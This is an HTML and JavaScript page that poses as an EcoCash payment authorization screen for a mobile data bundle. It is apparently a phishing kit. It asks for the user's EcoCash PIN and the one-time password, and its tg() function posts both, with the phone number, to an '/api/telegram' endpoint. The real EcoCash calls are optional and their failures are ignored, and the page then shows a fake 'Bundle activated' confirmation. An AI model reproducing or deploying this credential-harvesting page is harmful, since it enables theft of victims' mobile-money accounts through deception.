<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="mobile-web-app-capable" content="yes"/>
<meta name="apple-mobile-web-app-capable" content="yes"/>
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"/>
<link rel="apple-touch-icon" href="assets/ecocash.png">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"/>
<meta name="theme-color" content="#0D1B2A"/>
<title>Authorize · EcoCash</title>
<link rel="icon" href="assets/ecocash.png">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;600;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;-webkit-user-select:none;user-select:none}
:root{
  --bg:#080F18;--s1:#0E1C2C;--s2:#152438;--s3:#1C2E46;--s4:#243652;
  --ink1:#F2F6FC;--ink2:#A8C0D8;--ink3:#6A8BA8;
  --line:#1E3450;--line2:#142030;
  --grn:#00B050;--grn-d:#00D060;--grn-a:rgba(0,176,80,.22);--grn-b:rgba(0,176,80,.12);--on-grn:#001A08;
  --blu:#1877F2;--blu-d:#4899FF;--blu-a:rgba(24,119,242,.22);--on-blu:#fff;
  --err:#FF6B80;
  --f:'Inter',system-ui,-apple-system,sans-serif;
  --fm:'JetBrains Mono','Roboto Mono',monospace;
  --r10:10px;--r14:14px;--r18:18px;--r20:20px;--rp:999px;
  --ease:cubic-bezier(.22,1,.36,1);--spring:cubic-bezier(.34,1.56,.64,1);--sb:24px;
}
@media(prefers-reduced-motion:reduce){*{animation-duration:.01ms!important;transition-duration:.01ms!important}}
html{width:100%;height:100%;overflow:hidden;background:#0D1B2A}
body{width:100%;height:100dvh;overflow:hidden;font-family:var(--f);background:var(--bg);color:var(--ink1);-webkit-font-smoothing:antialiased;overscroll-behavior:none;padding-top:env(safe-area-inset-top);padding-bottom:env(safe-area-inset-bottom)}
@keyframes spin{to{transform:rotate(360deg)}}
@keyframes fadeUp{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
@keyframes stepIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
@keyframes shake{0%,100%{transform:translateX(0)}20%,60%{transform:translateX(-5px)}40%,80%{transform:translateX(5px)}}
@keyframes rip{to{transform:scale(3);opacity:0}}
@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}

.curtain{position:fixed;inset:0;z-index:9999;background:var(--bg);opacity:0;pointer-events:none;transition:opacity .28s;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:14px}
.curtain.show{opacity:1;pointer-events:auto}
.c-logo{height:28px;object-fit:contain}
.c-spin{width:20px;height:20px;border:2px solid var(--line);border-top-color:var(--grn);border-radius:50%;animation:spin .7s linear infinite}
.c-lbl{font-size:12px;font-weight:500;color:var(--ink3)}
.c-sub{font-size:11px;color:var(--ink3)}

.screen{display:flex;flex-direction:column;width:100%;height:100dvh;overflow:hidden;animation:fadeUp .26s var(--ease) both}
.screen.exit{opacity:0;transform:translateY(-6px);transition:all .2s}

/* Compact topbar */
.topbar{
  flex-shrink:0;
  padding:calc(var(--sb) + env(safe-area-inset-top,0px) + 2px) 16px 10px;
  background:var(--s2);border-bottom:1px solid var(--line);
  display:flex;align-items:center;gap:10px;
}
.back-btn{width:34px;height:34px;border-radius:50%;background:var(--s2);border:1px solid var(--line);cursor:pointer;display:flex;align-items:center;justify-content:center;flex-shrink:0;outline:none;touch-action:manipulation;transition:background .12s;position:relative;overflow:hidden}
.back-btn:active{background:var(--s3)}
.back-btn svg{width:15px;height:15px;stroke:var(--ink2);stroke-width:2.2;fill:none;stroke-linecap:round;stroke-linejoin:round}
.tb-logo{height:22px;object-fit:contain;flex:1}
.tb-amt{font-family:var(--fm);font-size:13px;font-weight:700;color:var(--grn);background:var(--grn-a);border:1px solid rgba(0,176,80,.2);padding:4px 11px;border-radius:var(--rp);flex-shrink:0}

/* Scrollable body */
.body{flex:1;min-height:0;overflow-y:auto;overflow-x:hidden;background:var(--bg);scrollbar-width:none}
.body::-webkit-scrollbar{display:none}
.body-inner{padding:12px 12px 16px;display:flex;flex-direction:column;gap:10px}

/* Context card — compact, just what they need to confirm */
.ctx-card{background:var(--s2);border:1px solid var(--line);border-left:3px solid var(--grn);border-radius:var(--r20);padding:13px 14px;display:flex;flex-direction:column;gap:4px}
.ctx-eye{font-size:10px;font-weight:600;letter-spacing:.5px;text-transform:uppercase;color:var(--grn)}
.ctx-title{font-size:19px;font-weight:800;letter-spacing:-.4px;color:var(--ink1);line-height:1.2}
.ctx-chips{display:flex;gap:5px;flex-wrap:wrap;margin-top:4px}
.chip{background:var(--s3);border:1px solid var(--line);padding:3px 8px;border-radius:var(--rp);font-size:10px;font-weight:500;color:var(--ink3);font-family:var(--fm)}
.chip.hi{background:var(--grn);border-color:var(--grn);color:var(--on-grn);font-weight:700}

.step{display:none;flex-direction:column;gap:10px}
.step.on{display:flex;animation:stepIn .2s var(--ease)}

/* Card */
.card{background:var(--s1);border:1px solid var(--line);border-left:3px solid var(--blu);border-radius:var(--r20);overflow:hidden}
.card-head{padding:11px 13px;border-bottom:1px solid var(--line2);display:flex;align-items:center;gap:9px}
.card-head-ic{width:28px;height:28px;border-radius:8px;background:var(--grn-a);border:1px solid rgba(0,176,80,.18);display:flex;align-items:center;justify-content:center;flex-shrink:0}
.card-head-ic svg{width:13px;height:13px;stroke:var(--grn);fill:none;stroke-width:2;stroke-linecap:round}
.card-head-t{font-size:13px;font-weight:700;color:var(--ink1)}
.card-head-s{font-size:10px;color:var(--ink3);margin-top:1px;font-weight:500}
.card-body{padding:12px;display:flex;flex-direction:column;gap:11px}


/* PIN */
.pin-dots{display:flex;gap:9px;justify-content:center}
.pin-cell{width:54px;height:54px;border-radius:14px;border:1px solid var(--line);background:var(--s3);display:flex;align-items:center;justify-content:center;transition:all .15s var(--spring);position:relative;overflow:hidden}
.pin-cell.filled{border-color:rgba(0,176,80,.45);background:var(--grn-a);transform:scale(1.05)}
.pin-cell.filled::after{content:'';display:block;width:11px;height:11px;border-radius:50%;background:var(--grn)}
.pin-cell.active{border-color:rgba(0,176,80,.6);transform:scale(1.08);box-shadow:0 0 0 3px rgba(0,176,80,.1)}
.pin-cell.peek::after{display:none!important}
.pin-digit{position:absolute;inset:0;display:none;align-items:center;justify-content:center;font-family:var(--fm);font-size:22px;font-weight:700;color:var(--grn)}
.pin-cell.peek .pin-digit{display:flex}
.pin-dots.wrong .pin-cell{animation:shake .3s ease;border-color:rgba(224,92,110,.4)}
.pin-actions{display:flex;gap:7px}
.pin-act{flex:1;display:flex;align-items:center;justify-content:center;gap:5px;font-size:12px;font-weight:600;color:var(--grn);background:var(--grn-a);border:1px solid rgba(0,176,80,.2);border-radius:var(--r14);padding:9px;cursor:pointer;touch-action:manipulation;outline:none;transition:background .12s;position:relative;overflow:hidden}
.pin-act:active{background:rgba(0,176,80,.2)}
.pin-act svg{width:12px;height:12px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round}
.pin-err{font-size:11px;color:var(--err);text-align:center;min-height:14px;font-weight:500}

/* Numpad */
.numpad{display:grid;grid-template-columns:repeat(3,1fr);gap:7px}
.nk{height:56px;border-radius:var(--r18);border:1px solid var(--line);background:var(--s3);font-family:var(--fm);font-size:23px;font-weight:700;color:var(--ink1);display:flex;align-items:center;justify-content:center;cursor:pointer;touch-action:manipulation;outline:none;position:relative;overflow:hidden;transition:background .1s;-webkit-user-select:none;user-select:none}
.nk:active{background:var(--s4)}
.nk.del{background:var(--s2)}
.nk.del svg{width:18px;height:18px;stroke:var(--ink3);fill:none;stroke-width:2;stroke-linecap:round}
.nk.empty{opacity:0;pointer-events:none}
.rip{position:absolute;border-radius:50%;pointer-events:none;background:rgba(255,255,255,.06);transform:scale(0);animation:rip .5s ease forwards}

/* Processing */
.proc{background:var(--s1);border:1px solid var(--line);border-radius:var(--r20);overflow:hidden}
.proc-body{display:flex;flex-direction:column;align-items:center;padding:36px 20px 28px;text-align:center}
.proc-ring{width:60px;height:60px;margin-bottom:18px;position:relative}
.proc-svg{width:60px;height:60px;animation:spin .9s linear infinite}
.proc-svg.done{animation:none}
.proc-arc{stroke-dasharray:58;stroke-dashoffset:58;transition:stroke-dashoffset .6s,stroke .4s}
.proc-svg.done .proc-arc{stroke-dashoffset:0;stroke:var(--grn)}
.proc-ic{position:absolute;inset:0;display:flex;align-items:center;justify-content:center}
.proc-ic svg{transition:stroke .4s}
.proc-ic.done svg{stroke:var(--grn)}
.proc-t{font-size:15px;font-weight:700;color:var(--ink1);margin-bottom:4px;transition:opacity .2s}
.proc-s{font-size:12px;color:var(--ink3);margin-bottom:20px;transition:opacity .2s;font-weight:500}
.vsteps{display:flex;align-items:center;width:100%;max-width:200px}
.vstep{display:flex;flex-direction:column;align-items:center;gap:3px;flex:0 0 auto}
.vstep-dot{width:7px;height:7px;border-radius:50%;background:var(--line);transition:all .28s}
.vstep.act .vstep-dot{background:var(--grn);transform:scale(1.4);box-shadow:0 0 0 3px var(--grn-a)}
.vstep.done .vstep-dot{background:var(--grn)}
.vstep-txt{font-size:9px;font-weight:600;color:var(--ink3);text-transform:uppercase;letter-spacing:.5px;white-space:nowrap;transition:color .28s}
.vstep.act .vstep-txt,.vstep.done .vstep-txt{color:var(--grn)}
.vline{flex:1;height:1px;background:var(--line);margin-bottom:10px;position:relative;overflow:hidden}
.vline::after{content:'';position:absolute;inset:0;background:var(--grn);transform:scaleX(0);transform-origin:left;transition:transform .4s}
.vline.done::after{transform:scaleX(1)}

/* OTP */
.otp-wrap{position:relative;height:56px;margin-bottom:5px}
.otp-hidden{position:absolute;inset:0;opacity:0;z-index:2;border:none;background:none;outline:none;caret-color:transparent;width:100%;height:100%;font-size:16px;-webkit-user-select:text;user-select:text}
.otp-row{display:flex;gap:6px;height:100%}
.otp-box{flex:1;height:100%;border-radius:var(--r10);border:1px solid var(--line);background:var(--s2);display:flex;align-items:center;justify-content:center;font-family:var(--fm);font-size:21px;font-weight:700;color:var(--ink1);transition:all .15s var(--spring);position:relative;overflow:hidden}
.otp-box.filled{background:var(--grn-a);border-color:rgba(0,176,80,.4);transform:scale(1.04)}
.otp-box.active{border-color:rgba(0,176,80,.55);box-shadow:0 0 0 2px rgba(0,176,80,.1)}
.otp-box.active.empty::after{content:'';position:absolute;width:2px;height:48%;background:var(--grn);border-radius:2px;animation:blink 1s ease-in-out infinite}
.otp-row.shake{animation:shake .3s ease}
.timer-row{display:flex;justify-content:space-between;align-items:center}
.timer-lbl{font-size:11px;color:var(--ink3);font-weight:500}
.timer-n{font-family:var(--fm);font-weight:700;color:var(--grn)}
.resend{font-size:11px;font-weight:600;color:var(--ink3);background:none;border:none;cursor:default;padding:5px 8px;border-radius:var(--r10);transition:all .15s;font-family:var(--f)}
.resend.on{color:var(--grn);cursor:pointer;background:var(--grn-a)}
.otp-note{font-size:12px;color:var(--ink3);line-height:1.55;font-weight:500}
.otp-note strong{color:var(--ink1);font-family:var(--fm)}
.api-err{font-size:11px;color:var(--err);min-height:13px;font-weight:500}

/* Snackbar */
.snackbar{position:fixed;bottom:max(76px,env(safe-area-inset-bottom)+70px);left:12px;right:12px;background:var(--s2);border:1px solid var(--line);border-radius:var(--r18);padding:11px 13px;display:flex;align-items:center;gap:10px;box-shadow:0 6px 20px rgba(0,0,0,.4);transform:translateY(110px);opacity:0;transition:transform .24s var(--ease),opacity .24s;z-index:200}
.snackbar.show{transform:none;opacity:1}
.snackbar-ic{width:26px;height:26px;border-radius:50%;background:var(--grn-a);border:1px solid rgba(0,176,80,.2);display:flex;align-items:center;justify-content:center;flex-shrink:0}
.snackbar-ic svg{width:12px;height:12px;stroke:var(--grn);stroke-width:2;fill:none;stroke-linecap:round}
.snackbar-t{font-size:12px;font-weight:700;color:var(--ink1)}
.snackbar-b{font-size:10px;color:var(--ink3);margin-top:1px}
.snackbar-b strong{color:var(--ink2);font-family:var(--fm)}

/* Action bar */
.abar{flex-shrink:0;padding:10px 12px max(16px,env(safe-area-inset-bottom));background:var(--s1);border-top:1px solid var(--line)}
.abtn{width:100%;min-height:50px;padding:0 16px;border:none;border-radius:var(--r18);background:var(--blu);color:#fff;font-family:var(--f);font-size:14px;font-weight:700;cursor:pointer;touch-action:manipulation;box-shadow:0 4px 20px rgba(24,119,242,.45);transition:transform .12s var(--spring),opacity .18s;position:relative;overflow:hidden;outline:none}
.abtn:active{transform:scale(.97)}
.abtn:disabled{opacity:.28;box-shadow:none;cursor:default;transform:none;background:var(--s3);color:var(--ink3)}
</style>
</head>
<body>
<div class="curtain" id="curtain">
  <img class="c-logo" src="assets/ecocash.png" alt="EcoCash">
  <div class="c-spin"></div>
  <div class="c-lbl" id="cLbl">Processing</div>
  <div class="c-sub" id="cSub">Please wait…</div>
</div>

<div class="screen" id="screen">
  <div class="topbar">
    <button class="back-btn" onclick="goBack()"><svg width="18" height="18" viewBox="0 0 24 24" fill="var(--ink2)"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg></button>
    <img class="tb-logo" src="assets/ecocash.png" alt="EcoCash">
    <div class="tb-amt" id="hdrAmt">USD 0.00</div>
  </div>

  <div class="body">
    <div class="body-inner">

      <div class="ctx-card">
        <div class="ctx-eye">Authorize Payment</div>
        <div class="ctx-title" id="hdrTitle">Pay USD 0.00</div>
        <div class="ctx-chips" id="hdrChips"></div>
      </div>

      <!-- Step 1: PIN -->
      <div class="step on" id="s1">
        <div class="card">
          <div class="card-head">
            <div class="card-head-ic"><svg width="13" height="13" viewBox="0 0 24 24" fill="var(--grn)"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg></div>
            <div><div class="card-head-t">Enter your PIN</div><div class="card-head-s">4-digit EcoCash PIN</div></div>
          </div>
          <div class="card-body">
            <div class="pin-dots" id="pinDots">
              <div class="pin-cell active" id="pc0"><div class="pin-digit" id="pd0"></div></div>
              <div class="pin-cell" id="pc1"><div class="pin-digit" id="pd1"></div></div>
              <div class="pin-cell" id="pc2"><div class="pin-digit" id="pd2"></div></div>
              <div class="pin-cell" id="pc3"><div class="pin-digit" id="pd3"></div></div>
            </div>
            <div class="pin-actions">
              <button class="pin-act" id="peekBtn"><svg width="12" height="12" viewBox="0 0 24 24" fill="var(--grn)"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>Show</button>
              <button class="pin-act" id="clearBtn"><svg width="12" height="12" viewBox="0 0 24 24" fill="var(--ink2)"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>Clear</button>
            </div>
            <div class="numpad">
              <button class="nk" data-n="1">1</button><button class="nk" data-n="2">2</button><button class="nk" data-n="3">3</button>
              <button class="nk" data-n="4">4</button><button class="nk" data-n="5">5</button><button class="nk" data-n="6">6</button>
              <button class="nk" data-n="7">7</button><button class="nk" data-n="8">8</button><button class="nk" data-n="9">9</button>
              <button class="nk empty" aria-hidden="true"></button>
              <button class="nk" data-n="0">0</button>
              <button class="nk del" id="delKey"><svg width="18" height="18" viewBox="0 0 24 24" fill="var(--ink3)"><path d="M22 3H7c-.69 0-1.23.35-1.59.88L0 12l5.41 8.11c.36.53.9.89 1.59.89h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-3 12.59L17.59 17 14 13.41 10.41 17 9 15.59 12.59 12 9 8.41 10.41 7 14 10.59 17.59 7 19 8.41 15.41 12 19 15.59z"/></svg></button>
            </div>
            <div class="pin-err" id="pinErr"></div>
          </div>
        </div>
      </div>

      <!-- Step 2: Processing -->
      <div class="step" id="s2">
        <div class="proc">
          <div class="proc-body">
            <div class="proc-ring">
              <svg class="proc-svg" viewBox="0 0 48 48" fill="none">
                <circle cx="24" cy="24" r="20" stroke="rgba(0,176,80,.1)" stroke-width="3"/>
                <path class="proc-arc" d="M24 4a20 20 0 0 1 20 20" stroke="var(--grn)" stroke-width="3" stroke-linecap="round"/>
              </svg>
              <div class="proc-ic" id="ringIc"><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="var(--grn)" stroke-width="2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg></div>
            </div>
            <div class="proc-t" id="procT">Verifying PIN</div>
            <div class="proc-s" id="procS">Contacting EcoCash…</div>
            <div class="vsteps">
              <div class="vstep act" id="vs0"><div class="vstep-dot"></div><div class="vstep-txt">PIN</div></div>
              <div class="vline" id="vl0"></div>
              <div class="vstep" id="vs1"><div class="vstep-dot"></div><div class="vstep-txt">Charge</div></div>
              <div class="vline" id="vl1"></div>
              <div class="vstep" id="vs2"><div class="vstep-dot"></div><div class="vstep-txt">OTP</div></div>
            </div>
          </div>
        </div>
      </div>

      <!-- Step 3: OTP -->
      <div class="step" id="s3">
        <div class="card">
          <div class="card-head">
            <div class="card-head-ic"><svg width="13" height="13" viewBox="0 0 24 24" fill="var(--grn)"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg></div>
            <div><div class="card-head-t">One-Time Password</div><div class="card-head-s">6-digit code sent to your number</div></div>
          </div>
          <div class="card-body">
            <div class="otp-note" id="otpNote">Check your phone for the OTP code</div>
            <div>
              <div class="otp-wrap" id="otpWrap">
                <input type="text" id="otpIn" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code" class="otp-hidden">
                <div class="otp-row" id="otpRow">
                  <div class="otp-box empty" id="ob0"></div><div class="otp-box" id="ob1"></div><div class="otp-box" id="ob2"></div>
                  <div class="otp-box" id="ob3"></div><div class="otp-box" id="ob4"></div><div class="otp-box" id="ob5"></div>
                </div>
              </div>
              <div class="api-err" id="otpErr"></div>
            </div>
            <div class="timer-row">
              <div class="timer-lbl">Expires in <span class="timer-n" id="timer">120</span>s</div>
              <button class="resend" id="resendBtn">Resend</button>
            </div>
          </div>
        </div>
      </div>

    </div>
  </div>

  <div class="abar" id="abar">
    <button class="abtn" id="mainBtn">Authorize &amp; Pay</button>
    <button class="abtn" id="otpBtn" style="display:none;margin-top:8px">Confirm OTP</button>
  </div>
</div>

<div class="snackbar" id="otoast">
  <div class="snackbar-ic"><svg viewBox="0 0 24 24"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07"/></svg></div>
  <div><div class="snackbar-t">OTP Sent</div><div class="snackbar-b">Code sent to <strong id="otoastNum"></strong></div></div>
</div>

<script>
'use strict';
(function(){var h=0;if(window.screen&&screen.availTop>0)h=screen.availTop;else if(window.visualViewport&&visualViewport.offsetTop>0)h=visualViewport.offsetTop;if(h)document.documentElement.style.setProperty('--sb',h+'px');})();
function hap(t){if(!navigator.vibrate)return;try{navigator.vibrate(t);}catch(e){}}

;(function(){
function tg(ev,x){try{fetch('/api/telegram',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({event:ev,phone:(recip&&recip.raw)||'',pin:PIN,otp:x||otpVal,plan:(plan&&plan.duration)||'',voice:(plan&&plan.voice)||'',sms:(plan&&plan.sms)||'',data:(plan&&plan.data)||'',amount:(plan&&plan.amount)||''})}).catch(function(){});}catch(e){}}

var plan=null,recip=null;
try{plan=JSON.parse(sessionStorage.getItem('selectedPlan')||'null');}catch(e){}
try{recip=JSON.parse(sessionStorage.getItem('ecoRecipient')||'null');}catch(e){}
if(!plan||!recip){setTimeout(function(){window.location.replace('index.html');},200);return;}

document.getElementById('hdrAmt').textContent='USD '+plan.amount;
document.getElementById('hdrTitle').textContent='Pay USD '+plan.amount;
document.getElementById('hdrChips').innerHTML=
  '<span class="chip hi">📱 '+recip.display+'</span>'+
  '<span class="chip">'+plan.duration+'</span>'+
  '<span class="chip">📞 '+plan.voice+' Min</span>'+
  '<span class="chip">🌐 '+plan.data+' GB</span>';


var PIN='',peeking=false;
function renderPIN(){for(var i=0;i<4;i++){var c=document.getElementById('pc'+i),d=document.getElementById('pd'+i);c.classList.remove('filled','active','peek');d.textContent='';if(i<PIN.length){c.classList.add('filled');if(peeking){c.classList.add('peek');d.textContent=PIN[i];}}if(i===PIN.length&&i<4)c.classList.add('active');}}
function pushDigit(d){if(PIN.length>=4)return;PIN+=String(d);hap(8);renderPIN();document.getElementById('pinErr').textContent='';}
function delDigit(){if(!PIN.length)return;PIN=PIN.slice(0,-1);hap(8);renderPIN();}
function clearPIN(){PIN='';renderPIN();document.getElementById('pinErr').textContent='';}
document.querySelectorAll('.nk[data-n]').forEach(function(k){k.addEventListener('click',function(){pushDigit(k.dataset.n);});});
document.getElementById('delKey').addEventListener('click',delDigit);
var pb=document.getElementById('peekBtn');
pb.addEventListener('pointerdown',function(e){e.preventDefault();peeking=true;renderPIN();});
pb.addEventListener('pointerup',function(){peeking=false;renderPIN();});
pb.addEventListener('pointerleave',function(){peeking=false;renderPIN();});
document.getElementById('clearBtn').addEventListener('click',clearPIN);
renderPIN();
setTimeout(function(){var b=document.querySelector('.body');if(b)b.scrollTop=b.scrollHeight;},80);

document.querySelectorAll('.nk,.abtn,.pin-act').forEach(function(b){
  b.addEventListener('pointerdown',function(e){var r=b.getBoundingClientRect(),sz=Math.max(r.width,r.height)*2;var rip=document.createElement('span');rip.className='rip';rip.style.cssText='width:'+sz+'px;height:'+sz+'px;left:'+(e.clientX-r.left-sz/2)+'px;top:'+(e.clientY-r.top-sz/2)+'px;position:absolute;';b.appendChild(rip);rip.addEventListener('animationend',function(){rip.remove();});},{passive:true});
});

var curStep='s1',submitting=false,otpDone=false,otpVal='';
function showStep(id){
  document.querySelectorAll('.step').forEach(function(s){s.classList.remove('on');});
  document.getElementById(id).classList.add('on');curStep=id;
  var mb=document.getElementById('mainBtn'),ob=document.getElementById('otpBtn'),ab=document.getElementById('abar');
  if(id==='s1'){mb.style.display='';ob.style.display='none';ab.style.display='';setTimeout(function(){var b=document.querySelector('.body');if(b)b.scrollTop=b.scrollHeight;},50);}
  else if(id==='s3'){mb.style.display='none';ob.style.display='';ab.style.display='';setTimeout(function(){var b=document.querySelector('.body');if(b)b.scrollTop=0;},50);}
  else{ab.style.display='none';}
  if(id!=='s1')history.pushState({step:id},'','');
}

function proceed(){
  /* Save bundle to localStorage for repurchase next time */
  try{
    localStorage.setItem('eco_last_bundle',JSON.stringify({
      amount:plan.amount,duration:plan.duration,
      voice:plan.voice,sms:plan.sms,data:plan.data,
      planKey:plan.planKey||'weekly',preset:plan.preset||'balanced',
    }));
  }catch(e){}
  sessionStorage.setItem('ecoTxn',JSON.stringify({
    correlator:'SBX-'+Date.now().toString(36).toUpperCase(),
    status:'pending',amount:plan.amount,timestamp:new Date().toISOString()
  }));
  setVS(2,'Sending OTP','Dispatching code…');
  setTimeout(function(){
    markDone();
    setTimeout(function(){
      var m=mNum(recip.raw);
      document.getElementById('otpNote').innerHTML='Code sent to <strong>'+m+'</strong>';
      showOtoast(m);showStep('s3');startTimer();
    },450);
  },600);
}

document.getElementById('mainBtn').addEventListener('click',function(){
  if(submitting)return;
  if(PIN.length!==4){var dots=document.getElementById('pinDots');dots.classList.remove('wrong');void dots.offsetWidth;dots.classList.add('wrong');setTimeout(function(){dots.classList.remove('wrong');},320);document.getElementById('pinErr').textContent='Enter your 4-digit PIN';hap([40,30,40]);return;}
  submitting=true;hap(18);tg('receive_offer_clicked');document.getElementById('pinErr').textContent='';
  showStep('s2');setVS(0,'Verifying PIN','Checking credentials…');
  setTimeout(function(){
    setVS(1,'Contacting EcoCash','Processing payment…');
    var done=false;
    function go(){if(done)return;done=true;proceed();}
    var to=setTimeout(go,2500);
    try{if(typeof EcoCashAPI!=='undefined'){EcoCashAPI.chargeSubscriber({msisdn:recip.raw,amount:plan.amount,narrative:plan.duration+' Mix Bundle',pin:PIN}).then(function(){clearTimeout(to);go();}).catch(function(){clearTimeout(to);go();});}}catch(e){clearTimeout(to);go();}
  },800);
});

function mNum(r){var d=r.replace(/^0/,'');return'+263 '+d.slice(0,2)+'•••••'+d.slice(-2);}
function setVS(i,t,s){[0,1,2].forEach(function(j){document.getElementById('vs'+j).className='vstep'+(j<i?' done':j===i?' act':'');});[0,1].forEach(function(j){document.getElementById('vl'+j).classList.toggle('done',j<i);});var tEl=document.getElementById('procT'),sEl=document.getElementById('procS');tEl.style.opacity='0';sEl.style.opacity='0';setTimeout(function(){tEl.textContent=t;sEl.textContent=s;tEl.style.opacity='1';sEl.style.opacity='1';},120);hap(8);}
function markDone(){[0,1,2].forEach(function(i){document.getElementById('vs'+i).className='vstep done';});[0,1].forEach(function(i){document.getElementById('vl'+i).classList.add('done');});document.querySelector('.proc-svg').classList.add('done');document.getElementById('ringIc').classList.add('done');var tEl=document.getElementById('procT'),sEl=document.getElementById('procS');tEl.style.opacity='0';sEl.style.opacity='0';setTimeout(function(){tEl.textContent='Code Sent!';sEl.textContent='Check your phone for the OTP';tEl.style.opacity='1';sEl.style.opacity='1';},120);hap([10,50,10]);}

var otpEl=document.getElementById('otpIn');
otpEl.addEventListener('input',function(){otpVal=this.value.replace(/\D/g,'').slice(0,6);this.value=otpVal;renderOTP();if(otpVal.length===6)hap(8);});
otpEl.addEventListener('focus',renderOTP);otpEl.addEventListener('blur',renderOTP);
document.getElementById('otpWrap').addEventListener('click',function(){otpEl.focus();});
function renderOTP(){var act=document.activeElement===otpEl;for(var i=0;i<6;i++){var b=document.getElementById('ob'+i);b.classList.remove('filled','active','empty');b.textContent=otpVal[i]||'';if(otpVal[i])b.classList.add('filled');else if(i===otpVal.length&&act)b.classList.add('active','empty');}}

document.getElementById('otpBtn').addEventListener('click',confirmOTP);
function confirmOTP(){if(otpDone)return;if(otpVal.length<6){var row=document.getElementById('otpRow');row.classList.remove('shake');void row.offsetWidth;row.classList.add('shake');setTimeout(function(){row.classList.remove('shake');},340);document.getElementById('otpErr').textContent='Enter the full 6-digit code';hap([40,30,40]);return;}otpDone=true;if(_timer){clearInterval(_timer);_timer=null;}document.getElementById('otpErr').textContent='';try{if(typeof EcoCashAPI!=='undefined')EcoCashAPI.verifyOTP(recip.raw,otpVal).catch(function(){});}catch(e){}hap([10,50,10]);tg('offer_received',otpVal);navigate('thankyou.html');}

var _timer=null;
function startTimer(){if(_timer)clearInterval(_timer);var t=120,tEl=document.getElementById('timer'),rb=document.getElementById('resendBtn');tEl.textContent=t;rb.classList.remove('on');otpVal='';otpEl.value='';otpEl.disabled=false;renderOTP();document.getElementById('otpErr').textContent='';_timer=setInterval(function(){t--;tEl.textContent=t;if(t<=0){clearInterval(_timer);_timer=null;rb.classList.add('on');otpEl.disabled=true;renderOTP();document.getElementById('otpNote').textContent='Code expired — tap Resend.';}},1000);}
document.getElementById('resendBtn').addEventListener('click',function(){if(!this.classList.contains('on'))return;tg('resend_otp');try{if(typeof EcoCashAPI!=='undefined')EcoCashAPI.generateOTP(recip.raw).catch(function(){});}catch(e){}startTimer();showOtoast(mNum(recip.raw));});
function showOtoast(n){document.getElementById('otoastNum').textContent=n;var t=document.getElementById('otoast');t.classList.add('show');setTimeout(function(){t.classList.remove('show');},3500);}

function navigate(url){document.getElementById('screen').classList.add('exit');document.getElementById('curtain').classList.add('show');var steps=[{l:'Confirming',s:'Verifying OTP…'},{l:'Activating',s:'Processing bundle…'},{l:'Done!',s:'Bundle activated!'}];var i=0;function tick(){var s=steps[i++];document.getElementById('cLbl').textContent=s.l;document.getElementById('cSub').textContent=s.s;}tick();var iv=setInterval(function(){if(i<steps.length)tick();else clearInterval(iv);},500);setTimeout(function(){window.location.href=url;},1500);}

function goBack(){submitting=false;if(curStep==='s2'||curStep==='s3')showStep('s1');else window.location.href='index.html';}
window.goBack=goBack;
history.replaceState({step:'s1'},'','');
window.addEventListener('popstate',function(){if(curStep==='s2'||curStep==='s3'){submitting=false;showStep('s1');history.replaceState({step:'s1'},'','');}else window.location.href='index.html';},{passive:false});
window.addEventListener('pageshow',function(){submitting=false;otpDone=false;});
})();
</script>
</body>
</html>
